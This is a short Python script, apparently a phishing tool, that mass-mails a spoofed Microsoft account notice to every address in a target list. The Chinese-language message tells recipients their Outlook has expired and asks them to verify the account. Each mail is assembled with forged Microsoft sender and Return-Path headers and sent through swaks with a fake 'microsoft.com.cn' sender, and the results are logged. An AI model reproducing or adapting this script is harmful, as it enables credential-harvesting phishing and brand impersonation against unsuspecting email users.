# -*- coding: utf-8 -*-
# ---
# @Software: PyCharm
# @File: test.py
# @Author: ---
# @Institution: likesoso.com
# @E-mail: xxx@likesoso.com
# @Site:
# @Time: Oct 30, 2020
# ---
import sys
import time
import subprocess

print("Usage: python3 exp.py target.txt")
file_a = '''Subject: =?UTF-8?B?566h55CG5ZGY?=
From: =?UTF-8?B?566h55CG5ZGY?= <admin@replay.qq.com>
X-Priority: 3
X-MSAPipeline: MessageDispatcherEOP
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="=-jErKQFJf2OxSAwY17mIV2g=="
Return-Path: account-security-noreply@accountprotection.microsoft.com

--=-jErKQFJf2OxSAwY17mIV2g==
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

Microsoft 帐户

您的Outlook已过期

由于系统升级、Outlook需要重新获取验证

为了不影响您的正常业务使用，我们只需确保这是你的电子邮件地址。

验证账户

谢谢!
Microsoft 帐户团队
--=-jErKQFJf2OxSAwY17mIV2g==
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 8bit
'''

file_target=open(sys.argv[1],"r")
receives=file_target.readlines()

for receive in receives:
    file_to = "To: " + '"' + receive.strip() + '"' + " <" + receive.strip() + ">\n"
    print(file_to)
    file_date = "Date: " + time.ctime() + "+0800\n"
    print(file_date)
    with open("./raw.html", "r") as html:
        html = html.read()
    with open('./raw.eml', 'w') as mail:
        mail.writelines(file_to)
        mail.close()
    with open('./raw.eml', 'a+') as mail:
        mail.writelines(file_date + file_a)
        mail.writelines(html+"\n")
        mail.close()
    status = subprocess.Popen(['swaks', '--data', './raw.eml', '--to', receive.strip(), '--from', 'replay@microsoft.com.cn'],stdout=subprocess.PIPE)
    lg = status.stdout.readlines()
    print(type(lg))
    with open('./log.txt', 'a+') as g:
        for line in lg:
            g.write(line.decode())
